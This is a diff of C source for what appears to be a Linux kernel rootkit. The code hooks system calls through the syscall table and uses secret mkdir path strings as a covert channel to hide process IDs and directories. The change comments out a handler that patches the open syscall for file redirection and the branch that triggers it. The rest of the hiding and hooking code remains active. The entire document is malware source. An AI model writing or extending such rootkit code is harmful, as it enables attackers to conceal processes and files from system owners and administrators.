@@ -32,11 +32,11 @@ int hidePidApiHandler(char* pid) {
 
 int openShim(char *filename, int flags, umode_t mode);
 
-int activateProcModulesApiHandler(void) {
+/*int activateProcModulesApiHandler(void) {
 	printk(KERN_INFO "file redirection enabled\n");
 	patch(SYS_open, openShim);
 	return 0;
-}
+}*/
 
 int hideDirectoryApiHandler(char* path) {
 	int i;
@@ -76,9 +76,9 @@ int mkdirShim(char* path) {
 	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepid, 20)) {
 		return hidePidApiHandler(path + 20);
 	}
-	else if (strnstrn(path, strnlen(path, 20), secret_api_procmods, 20)) {
+	/*else if (strnstrn(path, strnlen(path, 20), secret_api_procmods, 20)) {
 		return activateProcModulesApiHandler();
-	}
+	}*/
 	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
 }
 
